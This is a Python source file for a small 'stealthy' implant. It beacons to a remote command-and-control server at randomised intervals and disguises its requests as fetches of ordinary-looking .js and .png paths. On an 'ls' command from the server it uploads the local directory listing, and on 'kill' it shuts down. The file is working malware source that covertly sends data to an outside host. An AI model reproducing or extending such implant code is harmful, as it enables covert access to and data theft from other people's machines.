#!/usr/bin/env python3
from argparse import ArgumentParser
from http.server import HTTPServer
from time import sleep, time
from threading import Thread, Event
from os import listdir

import requests
import socket
import random
import json


connected = False
server_ip = None



def build_uri(ext=".js"):
    data = json.load(open("./client/dictionary.json"))
    if ext == ".js":
        URI = "/" + random.choice(data.get("poll_paths")) + "/" +random.choice(data.get("poll_files")) + ext
    elif ext == ".png":
        URI = "/" + random.choice(data.get("kill_paths")) + "/" +random.choice(data.get("kill_files")) + ext
    elif ext == "":
        URI = "/" + random.choice(data.get("paths")) + "/" +random.choice(data.get("files"))
    else:
        return None
    return URI



def send_heartbeat(stop_event):
    global server_ip
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    t = (30 + random.randint(1, 31)) * 1
    last = 0
    while not stop_event.is_set():
        current = time()
        if current >= last + t or last==0: # simulate sleep but letting the stop_event kill the loop, using sleep doesn't let it happens
            last = current
            res = requests.get(url="http://" + server_ip + build_uri(), params={})
            print(f'{res.status_code}: {res.text}')
            if "kill" in res.text:
                res = requests.get(url="http://"+server_ip + build_uri(".png"), params={})
                stop_event.set()
            elif "ls" in res.text:
                res = requests.post(url="http://" + server_ip + build_uri(""), params={"data":f'{listdir(".")}'.encode()})
        sleep(.5)





if __name__ == "__main__":
    print("Stealthy run implant")

    processes = [send_heartbeat]
    threads = list()
    stop_event = Event()

    parser = ArgumentParser(prog="SimpleClient")
    parser.add_argument("ip", type=str)
    args = parser.parse_args()
    print("Server at: ", args.ip)
    server_ip = args.ip


    for process in processes:
        t = Thread(target=process, args=(stop_event,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()